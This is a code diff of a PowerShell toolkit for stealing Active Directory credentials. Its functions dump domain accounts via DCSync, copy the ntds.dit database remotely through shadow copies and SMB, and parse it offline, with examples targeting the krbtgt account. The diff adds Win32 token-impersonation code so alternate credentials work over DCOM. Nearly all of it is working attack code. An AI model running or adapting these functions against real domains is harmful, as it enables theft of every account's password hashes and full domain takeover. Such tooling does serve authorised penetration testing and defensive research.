@@ -1,6 +1,6 @@
 #requires -version 3
 
-function Invoke-DCSync {
+Function Invoke-DCSync {
 <#
 .SYNOPSIS
     Dump domain accounts from Active Directory.
@@ -31,15 +31,17 @@ function Invoke-DCSync {
 .EXAMPLE
     PS C:\> Invoke-DCSync -Server DC.ADATUM.CORP -Credential ADATUM\Administrator -SamAccountName krbtgt
 #>
+
+    [CmdletBinding()]
     Param (
         [ValidateNotNullOrEmpty()]
         [String]
         $Server = $env:LOGONSERVER,
 
         [ValidateNotNullOrEmpty()]
-        [System.Management.Automation.PSCredential]
-        [System.Management.Automation.Credential()]
-        $Credential = [System.Management.Automation.PSCredential]::Empty,
+        [Management.Automation.PSCredential]
+        [Management.Automation.Credential()]
+        $Credential = [Management.Automation.PSCredential]::Empty,
 
         [ValidateNotNullOrEmpty()]
         [String]
@@ -103,7 +105,7 @@ function Invoke-DCSync {
     }
 }
 
-function Get-ADDatabase {
+Function Get-ADDatabase {
 <#
 .SYNOPSIS
     Steal Active Directory database remotely.
@@ -134,15 +136,17 @@ function Get-ADDatabase {
 .EXAMPLE
     PS C:\> Get-ADDatabase -Server DC.ADATUM.CORP -Credential ADATUM\Administrator -Protocol Wsman -Method NtdsUtil
 #>
+
+    [CmdletBinding()]
     Param (
         [ValidateNotNullOrEmpty()]
         [String]
         $Server = $env:LOGONSERVER,
 
         [ValidateNotNullOrEmpty()]
-        [System.Management.Automation.PSCredential]
-        [System.Management.Automation.Credential()]
-        $Credential = [System.Management.Automation.PSCredential]::Empty,
+        [Management.Automation.PSCredential]
+        [Management.Automation.Credential()]
+        $Credential = [Management.Automation.PSCredential]::Empty,
 
         [ValidateSet('Dcom', 'Wsman')]
         [String]
@@ -172,6 +176,69 @@ function Get-ADDatabase {
                 $psSession = New-PSSession -ComputerName $Server -SessionOption $psOption
             }
         }
+
+        # Adapted from PowerView by @harmj0y and @mattifestation
+        Function Local:Invoke-UserImpersonation {
+            [OutputType([IntPtr])]
+            [CmdletBinding(DefaultParameterSetName = 'Credential')]
+            Param(
+                [Parameter(Mandatory = $True, ParameterSetName = 'Credential')]
+                [Management.Automation.PSCredential]
+                [Management.Automation.CredentialAttribute()]
+                $Credential,
+
+                [Parameter(Mandatory = $True, ParameterSetName = 'TokenHandle')]
+                [ValidateNotNull()]
+                [IntPtr]
+                $TokenHandle,
+
+                [Switch]
+                $Quiet
+            )
+
+            if (([Threading.Thread]::CurrentThread.GetApartmentState() -ne 'STA') -and (-not $PSBoundParameters['Quiet'])) {
+                Write-Warning "[UserImpersonation] powershell.exe is not currently in a single-threaded apartment state, token impersonation may not work."
+            }
+
+            if ($PSBoundParameters['TokenHandle']) {
+                $LogonTokenHandle = $TokenHandle
+            }
+            else {
+                $LogonTokenHandle = [IntPtr]::Zero
+                $NetworkCredential = $Credential.GetNetworkCredential()
+                $UserDomain = $NetworkCredential.Domain
+                $UserName = $NetworkCredential.UserName
+                Write-Verbose "[UserImpersonation] Executing LogonUser() with user: $($UserDomain)\$($UserName)"
+
+                if (-not [Win32]::LogonUserA($UserName, $UserDomain, $NetworkCredential.Password, 9, 3, [ref]$LogonTokenHandle)) {
+                    $LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
+                    throw "[UserImpersonation] LogonUser() Error: $(([ComponentModel.Win32Exception] $LastError).Message)"
+                }
+            }
+
+            if (-not [Win32]::ImpersonateLoggedOnUser($LogonTokenHandle)) {
+                throw "[UserImpersonation] ImpersonateLoggedOnUser() Error: $(([ComponentModel.Win32Exception] $LastError).Message)"
+            }
+            $LogonTokenHandle
+        }
+
+        Function Local:Invoke-RevertToSelf {
+            [CmdletBinding()]
+            Param(
+                [ValidateNotNull()]
+                [IntPtr]
+                $TokenHandle
+            )
+
+            if ($PSBoundParameters['TokenHandle']) {
+                Write-Verbose "[RevertToSelf] Reverting token impersonation and closing LogonUser() token handle"
+                [Win32]::CloseHandle($TokenHandle) | Out-Null
+            }
+            if (-not [Win32]::RevertToSelf()) {
+                $LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
+                throw "[RevertToSelf] RevertToSelf() Error: $(([ComponentModel.Win32Exception] $LastError).Message)"
+            }
+        }
     }
 
     PROCESS {
@@ -180,7 +247,7 @@ function Get-ADDatabase {
             Write-Host "[*] Identifying the operating system version of $Server"
             $OS = Get-CimInstance -ClassName Win32_OperatingSystem -CimSession $cimSession
             if ($OS.Version[0] -lt 6) {
-                Write-Host "[-] Copy method not supported by the target host"
+                Write-Warning "ShadowCopy method not supported by the target host."
                 return
             }
 
@@ -201,7 +268,7 @@ function Get-ADDatabase {
                 # Download files via SMB
                 if ($Credential.Username) {
                     $drive = "S"
-                    New-PSDrive -Name $drive -Root "\\$Server\C`$" -Credential $Credential -PSProvider "FileSystem" | Out-Null
+                    New-PSDrive -Name $drive -Root "\\$Server\C$" -Credential $Credential -PSProvider "FileSystem" | Out-Null
                     Copy-Item -Recurse -Path $($tempDir -Replace "C:","${drive}:") -Destination "$TargetDirectory"
                     Remove-PSDrive $drive
                 }
@@ -216,12 +283,11 @@ function Get-ADDatabase {
         }
         else {
             if ($Credential.Username -and $Protocol -eq 'Dcom') {
-                Write-Warning "Alternative credentials can't be used with the ShadowCopy method through DCOM."
-                return
+                $logonToken = Invoke-UserImpersonation -Credential $Credential
             }
 
             Write-Host "[*] Grabbing the location of the ntds.dit file on $Server"
-            $HKLM = [uint32]2147483650
+            [uint32]$HKLM = 2147483650
             $key = "SYSTEM\\CurrentControlSet\\Services\\NTDS\Parameters"
             $value = "DSA Database File"
             $ditPath = (Invoke-CimMethod -ClassName StdRegProv -Name GetStringValue -Arguments @{hDefKey=$HKLM; sSubKeyName=$key; sValueName=$value} -CimSession $cimSession).sValue
@@ -254,22 +320,22 @@ function Get-ADDatabase {
                 # Create a SafeFileHandle of the UNC path
                 $handle = [Win32]::CreateFileW(
                     "\\$Server\$($ditDrive -Replace ':','$')",
-                    [System.Security.AccessControl.FileSystemRights]"ListDirectory",
-                    [System.IO.FileShare]::ReadWrite,
-                    [System.IntPtr]::Zero,
-                    [System.IO.FileMode]::Open,
+                    [Security.AccessControl.FileSystemRights]"ListDirectory",
+                    [IO.FileShare]::ReadWrite,
+                    [IntPtr]::Zero,
+                    [IO.FileMode]::Open,
                     0x02000000,
-                    [System.IntPtr]::Zero
+                    [IntPtr]::Zero
                 )
                 if ($handle.IsInvalid) {
                     Write-Error -Message "CreateFileW failed"
                 }
                 # Invoke NtFsControlFile to access the snapshots
-                $transDataSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][Win32+NT_Trans_Data])
+                $transDataSize = [Runtime.InteropServices.Marshal]::SizeOf([Type][Win32+NT_Trans_Data])
                 $bufferSize = $transDataSize + 4
-                $outBuffer = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($bufferSize)
+                $outBuffer = [Runtime.InteropServices.Marshal]::AllocHGlobal($bufferSize)
                 $ioBlock = New-Object -TypeName Win32+IO_STATUS_BLOCK
-                [Win32]::NtFsControlFile($handle, [System.IntPtr]::Zero, [System.IntPtr]::Zero, [System.IntPtr]::Zero, [Ref]$ioBlock, 0x00144064, [System.IntPtr]::Zero, 0, $outBuffer, $bufferSize) | Out-Null
+                [Win32]::NtFsControlFile($handle, [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero, [Ref]$ioBlock, 0x00144064, [IntPtr]::Zero, 0, $outBuffer, $bufferSize) | Out-Null
 
                 # Download files via SMB
                 $shadowPath = $shadowCopy.InstallDate.ToUniversalTime().ToString("'@GMT-'yyyy.MM.dd-HH.mm.ss")
@@ -308,23 +374,23 @@ function Get-ADDatabase {
                 else {
                     # Create a SafeFileHandle of the UNC path
                     $handle = [Win32]::CreateFileW(
-                        "\\$Server\C`$",
-                        [System.Security.AccessControl.FileSystemRights]"ListDirectory",
-                        [System.IO.FileShare]::ReadWrite,
-                        [System.IntPtr]::Zero,
-                        [System.IO.FileMode]::Open,
+                        "\\$Server\C$",
+                        [Security.AccessControl.FileSystemRights]"ListDirectory",
+                        [IO.FileShare]::ReadWrite,
+                        [IntPtr]::Zero,
+                        [IO.FileMode]::Open,
                         0x02000000,
-                        [System.IntPtr]::Zero
+                        [IntPtr]::Zero
                     )
                     if ($handle.IsInvalid) {
                         Write-Error -Message "CreateFileW failed"
                     }
                     # Invoke NtFsControlFile to access the snapshots
-                    $transDataSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][Win32+NT_Trans_Data])
+                    $transDataSize = [Runtime.InteropServices.Marshal]::SizeOf([Type][Win32+NT_Trans_Data])
                     $bufferSize = $transDataSize + 4
-                    $outBuffer = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($bufferSize)
+                    $outBuffer = [Runtime.InteropServices.Marshal]::AllocHGlobal($bufferSize)
                     $ioBlock = New-Object -TypeName Win32+IO_STATUS_BLOCK
-                    [Win32]::NtFsControlFile($handle, [System.IntPtr]::Zero, [System.IntPtr]::Zero, [System.IntPtr]::Zero, [Ref]$ioBlock, 0x00144064, [System.IntPtr]::Zero, 0, $outBuffer, $bufferSize) | Out-Null
+                    [Win32]::NtFsControlFile($handle, [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero, [Ref]$ioBlock, 0x00144064, [IntPtr]::Zero, 0, $outBuffer, $bufferSize) | Out-Null
                 }
             }
 
@@ -361,10 +427,14 @@ function Get-ADDatabase {
         if ($Protocol -eq 'Wsman') {
             Remove-PSSession -Session $psSession
         }
+
+        if ($logonToken) {
+            Invoke-RevertToSelf -TokenHandle $logonToken
+        }
     }
 }
 
-function Dump-ADDatabase {
+Function Dump-ADDatabase {
 <#
 .SYNOPSIS
     Dump domain accounts from an offline Active Directory database.
@@ -395,6 +465,8 @@ function Dump-ADDatabase {
 .EXAMPLE
     PS C:\> Dump-ADDatabase -DatabasePath C:\Windows\Temp\ntds.dit -SystemHiveFilePath C:\Windows\Temp\SYSTEM -SamAccountName krbtgt
 #>
+
+    [CmdletBinding()]
     Param (
         [ValidateNotNullOrEmpty()]
         [String]
@@ -438,7 +510,7 @@ function Dump-ADDatabase {
     }
 }
 
-function Mount-ADDatabase {
+Function Mount-ADDatabase {
 <#
 .SYNOPSIS
     Mount an Active Directory database locally.
@@ -472,6 +544,8 @@ function Mount-ADDatabase {
 .EXAMPLE
     PS C:\> Mount-ADDatabase -DatabasePath C:\Windows\Temp\ntds.dit -AllowUpgrade -LdapPort 1389
 #>
+
+    [CmdletBinding()]
     Param (
         [ValidateNotNullOrEmpty()]
         [String]
@@ -520,11 +594,11 @@ function Mount-ADDatabase {
     }
 }
 
-function Umount-ADDatabase {
+Function Umount-ADDatabase {
     Get-Process dsamain -ErrorAction SilentlyContinue | Stop-Process
 }
 
-function Invoke-LdapSearch {
+Function Invoke-LdapSearch {
 <#
 .SYNOPSIS
     Search for domain objects in Active Directory.
@@ -551,6 +625,8 @@ function Invoke-LdapSearch {
 .EXAMPLE
     PS C:\> Invoke-LdapSearch -Server localhost:1389 -LdapFilter "(objectClass=person)" -Properties sAMAccountName
 #>
+
+    [CmdletBinding()]
     Param (
         [ValidateNotNullOrEmpty()]
         [String]
@@ -603,7 +679,7 @@ function Invoke-LdapSearch {
     }
 }
 
-$source = @"
+Add-Type -TypeDefinition @"
 using Microsoft.Win32.SafeHandles;
 using System;
 using System.IO;
@@ -618,7 +694,6 @@ public class Win32
         public UInt32 Status;
         public UInt32 Information;
     }
-
     [StructLayout(LayoutKind.Sequential)]
     public struct NT_Trans_Data
     {
@@ -626,7 +701,6 @@ public class Win32
         public UInt32 NumberOfSnapShotsReturned;
         public UInt32 SnapShotArraySize;
     }
-
     [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
     public static extern SafeFileHandle CreateFileW(
         string lpFileName,
@@ -636,7 +710,6 @@ public class Win32
         FileMode dwCreationDisposition,
         UInt32 dwFlagsAndAttributes,
         IntPtr hTemplateFile);
-
     [DllImport("ntdll.dll", SetLastError = true, CharSet = CharSet.Unicode)]
     public static extern UInt32 NtFsControlFile(
         SafeFileHandle hDevice,
@@ -649,6 +722,21 @@ public class Win32
         UInt32 InputBufferLength,
         IntPtr OutputBuffer,
         UInt32 OutputBufferLength);
+
+    [DllImport("advapi32.dll", SetLastError=true)]
+    public static extern bool LogonUserA(
+        string lpszUserName, 
+        string lpszDomain,
+        string lpszPassword,
+        int dwLogonType, 
+        int dwLogonProvider,
+        ref IntPtr  phToken
+    );
+    [DllImport("advapi32.dll", SetLastError=true)]
+    public static extern bool ImpersonateLoggedOnUser(IntPtr hToken);
+    [DllImport("advapi32.dll", SetLastError=true)]
+    public static extern bool RevertToSelf();
+    [DllImport("kernel32.dll", SetLastError=true)]
+    public static extern bool CloseHandle(IntPtr hObject);
 }
 "@
-Add-Type -TypeDefinition $source
